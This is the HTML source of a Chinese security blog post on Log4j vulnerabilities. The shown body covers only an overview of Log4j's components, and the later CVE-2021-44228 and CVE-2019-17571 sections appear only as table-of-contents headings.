@@ -1,0 +1,966 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dililearngent.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":{"gitalk":{"order":-1}},"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Log4j组件的相关利用及漏洞分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全之Log4j漏洞分析与利用">
+<meta property="og:url" content="https://dililearngent.github.io/2023/04/27/Log4j-security/index.html">
+<meta property="og:site_name" content="DiliLearngent&#39;s Blog">
+<meta property="og:description" content="Log4j组件的相关利用及漏洞分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115163512.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115173350.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115173519.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115201706.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115211353.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115214250.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115215742.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115221647.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115222343.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115224135.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115224535.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115224747.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231116144706.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231116162949.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119154921.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119195600.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119173441.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119201941.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119203118.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119203348.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119203724.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119204528.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119232748.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231120110302.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231117170159.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231117171246.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231117171533.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231117172522.png">
+<meta property="article:published_time" content="2023-04-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-07-27T16:00:00.000Z">
+<meta property="article:author" content="DiliLearngent">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115163512.png">
+
+
+<link rel="canonical" href="https://dililearngent.github.io/2023/04/27/Log4j-security/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://dililearngent.github.io/2023/04/27/Log4j-security/","path":"2023/04/27/Log4j-security/","title":"Java安全之Log4j漏洞分析与利用"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java安全之Log4j漏洞分析与利用 | DiliLearngent's Blog</title>
+  
+
+
+
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">DiliLearngent's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人要終於年輕時候的夢想！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">安全问题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2021-44228%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">CVE-2021-44228分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">3.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="nav-number">3.2.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="nav-number">3.3.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-number">3.4.</span> <span class="nav-text">函数调用栈</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="nav-number">3.5.</span> <span class="nav-text">详细分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%85%B3%E9%94%AE%E7%82%B9"><span class="nav-number">3.6.</span> <span class="nav-text">代码关键点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%95%E8%AF%95info%E6%96%B9%E6%B3%95"><span class="nav-number">3.7.</span> <span class="nav-text">试试info方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#log4j-2-15-0-rc1%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">log4j-2.15.0-rc1分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">4.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">4.2.</span> <span class="nav-text">修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">4.3.</span> <span class="nav-text">绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="nav-number">4.4.</span> <span class="nav-text">测试代码：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88-1"><span class="nav-number">4.5.</span> <span class="nav-text">函数调用栈</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="nav-number">4.6.</span> <span class="nav-text">绕过分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#log4j-2-15-0-rc2%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">log4j-2.15.0-rc2分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%90%BD%E5%B9%95"><span class="nav-number">6.</span> <span class="nav-text">落幕</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2019-17571"><span class="nav-number">7.</span> <span class="nav-text">CVE-2019-17571</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="nav-number">7.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleSocketServer%E7%B1%BB"><span class="nav-number">7.2.</span> <span class="nav-text">SimpleSocketServer类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%90%E5%9B%A0"><span class="nav-number">7.3.</span> <span class="nav-text">成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83-1"><span class="nav-number">7.4.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81-1"><span class="nav-number">7.5.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88-2"><span class="nav-number">7.6.</span> <span class="nav-text">函数调用栈</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90-1"><span class="nav-number">7.7.</span> <span class="nav-text">详细分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">8.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="DiliLearngent"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">DiliLearngent</p>
+  <div class="site-description" itemprop="description">保持热爱!</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/DiliLearngent" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DiliLearngent" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+<div style="">
+  <canvas id="canvas" style="width:60%;">当前浏览器不支持canvas，请更换浏览器后再试</canvas>
+</div>
+<script>
+(function(){
+
+   var digit=
+    [
+        [
+            [0,0,1,1,1,0,0],
+            [0,1,1,0,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,0,1,1,0],
+            [0,0,1,1,1,0,0]
+        ],//0
+        [
+            [0,0,0,1,1,0,0],
+            [0,1,1,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [1,1,1,1,1,1,1]
+        ],//1
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,0,0,0],
+            [0,1,1,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,0,0,0,1,1],
+            [1,1,1,1,1,1,1]
+        ],//2
+        [
+            [1,1,1,1,1,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//3
+        [
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,1,0],
+            [0,0,1,1,1,1,0],
+            [0,1,1,0,1,1,0],
+            [1,1,0,0,1,1,0],
+            [1,1,1,1,1,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,1,1]
+        ],//4
+        [
+            [1,1,1,1,1,1,1],
+            [1,1,0,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,1,1,1,1,0],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//5
+        [
+            [0,0,0,0,1,1,0],
+            [0,0,1,1,0,0,0],
+            [0,1,1,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,0,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//6
+        [
+            [1,1,1,1,1,1,1],
+            [1,1,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0]
+        ],//7
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//8
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,1,1,0,0,0,0]
+        ],//9
+        [
+            [0,0,0,0,0,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,0,0,0],
+            [0,0,0,0,0,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,0,0,0]
+        ]//:
+    ];
+
+var canvas = document.getElementById('canvas');
+
+if(canvas.getContext){
+    var cxt = canvas.getContext('2d');
+    //声明canvas的宽高
+    var H = 100,W = 700;
+    canvas.height = H;
+    canvas.width = W;
+    cxt.fillStyle = '#f00';
+    cxt.fillRect(10,10,50,50);
+
+    //存储时间数据
+    var data = [];
+    //存储运动的小球
+    var balls = [];
+    //设置粒子半径
+    var R = canvas.height/20-1;
+    (function(){
+        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
+        //存储时间数字，由十位小时、个位小时、冒号、十位分钟、个位分钟、冒号、十位秒钟、个位秒钟这7个数字组成
+        data.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
+    })();
+
+    /*生成点阵数字*/
+    function renderDigit(index,num){
+        for(var i = 0; i < digit[num].length; i++){
+            for(var j = 0; j < digit[num][i].length; j++){
+                if(digit[num][i][j] == 1){
+                    cxt.beginPath();
+                    cxt.arc(14*(R+2)*index + j*2*(R+1)+(R+1),i*2*(R+1)+(R+1),R,0,2*Math.PI);
+                    cxt.closePath();
+                    cxt.fill();
+                }
+            }
+        }
+    }
+
+    /*更新时钟*/
+    function updateDigitTime(){
+        var changeNumArray = [];
+        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
+        var NewData = [];
+        NewData.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
+        for(var i = data.length-1; i >=0 ; i--){
+            //时间发生变化
+            if(NewData[i] !== data[i]){
+                //将变化的数字值和在data数组中的索引存储在changeNumArray数组中
+                changeNumArray.push(i+'_'+(Number(data[i])+1)%10);
+            }
+        }
+        //增加小球
+        for(var i = 0; i< changeNumArray.length; i++){
+            addBalls.apply(this,changeNumArray[i].split('_'));
+        }
+        data = NewData.concat();
+    }
+
+    /*更新小球状态*/
+    function updateBalls(){
+        for(var i = 0; i < balls.length; i++){
+            balls[i].stepY += balls[i].disY;
+            balls[i].x += balls[i].stepX;
+            balls[i].y += balls[i].stepY;
+            if(balls[i].x > W + R || balls[i].y > H + R){
+                balls.splice(i,1);
+                i--;
+            }
+        }
+    }
+
+    /*增加要运动的小球*/
+    function addBalls(index,num){
+        var numArray = [1,2,3];
+        var colorArray =  ["#3BE","#09C","#A6C","#93C","#9C0","#690","#FB3","#F80","#F44","#C00"];
+        for(var i = 0; i < digit[num].length; i++){
+            for(var j = 0; j < digit[num][i].length; j++){
+                if(digit[num][i][j] == 1){
+                    var ball = {
+                        x:14*(R+2)*index + j*2*(R+1)+(R+1),
+                        y:i*2*(R+1)+(R+1),
+                        stepX:Math.floor(Math.random() * 4 -2),
+                        stepY:-2*numArray[Math.floor(Math.random()*numArray.length)],
+                        color:colorArray[Math.floor(Math.random()*colorArray.length)],
+                        disY:1
+                    };
+                    balls.push(ball);
+                }
+            }
+        }
+    }
+
+    /*渲染*/
+    function render(){
+        //重置画布宽度，达到清空画布的效果
+        canvas.height = 100;
+        //渲染时钟
+        for(var i = 0; i < data.length; i++){
+            renderDigit(i,data[i]);
+        }
+        //渲染小球
+        for(var i = 0; i < balls.length; i++){
+            cxt.beginPath();
+            cxt.arc(balls[i].x,balls[i].y,R,0,2*Math.PI);
+            cxt.fillStyle = balls[i].color;
+            cxt.closePath();
+            cxt.fill();
+        }
+    }
+
+    clearInterval(oTimer);
+    var oTimer = setInterval(function(){
+        //更新时钟
+        updateDigitTime();
+        //更新小球状态
+        updateBalls();
+        //渲染
+        render();
+    },50);
+}
+
+})();
+</script>
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://dililearngent.github.io/2023/04/27/Log4j-security/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="DiliLearngent">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DiliLearngent's Blog">
+      <meta itemprop="description" content="保持热爱!">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java安全之Log4j漏洞分析与利用 | DiliLearngent's Blog">
+      <meta itemprop="description" content="Log4j组件的相关利用及漏洞分析">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java安全之Log4j漏洞分析与利用
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-04-28 00:00:00" itemprop="dateCreated datePublished" datetime="2023-04-28T00:00:00+08:00">2023-04-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-07-28 00:00:00" itemprop="dateModified" datetime="2023-07-28T00:00:00+08:00">2023-07-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>6.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>22 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">Log4j组件的相关利用及漏洞分析</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Log4j是一个用于Java应用程序的日志记录工具，它提供了灵活的日志记录配置和强大的日志记录功能。Log4j允许开发人员在应用程序中记录不同级别的日志消息，并将这些消息输出到不同的目标（例如控制台、文件、数据库等）。</p>
+<p><strong>Log4j的主要组件和概念如下</strong>：</p>
+<p>日志记录器（Logger）：日志记录器是Log4j的核心组件。它负责接收应用程序中的日志消息并将其传递到适当的目标。每个日志记录器都有一个唯一的名称，开发人员可以根据需要创建多个日志记录器实例。</p>
+<p>日志级别（Log Level）：Log4j定义了不同的日志级别，用于标识日志消息的重要性和严重程度。常见的日志级别包括DEBUG、INFO、WARN、ERROR和FATAL。开发人员可以根据应用程序的需求选择适当的日志级别。</p>
+<p>Appender：Appender用于确定日志消息的输出目标。Log4j提供了多种类型的Appender，例如ConsoleAppender（将日志消息输出到控制台）、FileAppender（将日志消息输出到文件）、DatabaseAppender（将日志消息保存到数据库）等。开发人员可以根据需要配置和使用适当的Appender。</p>
+<p>日志布局（Layout）：日志布局决定了日志消息在输出目标中的格式。Log4j提供了多种预定义的日志布局，例如简单的文本布局、HTML布局、JSON布局等。开发人员也可以自定义日志布局来满足特定的需求。</p>
+<p>配置文件（Configuration File）：Log4j的配置文件用于指定日志记录器、Appender、日志级别和日志布局等的配置信息。配置文件通常是一个XML文件或属性文件。通过配置文件，开发人员可以灵活地配置日志系统，包括定义日志记录器的层次结构、指定日志级别和输出目标等。</p>
+<p>Log4j提供了丰富的功能和灵活的配置选项，使开发人员能够根据应用程序的需求进行高度定制的日志记录。它已经成为Java应用程序中最受欢迎和广泛使用的日志记录框架之一。</p>
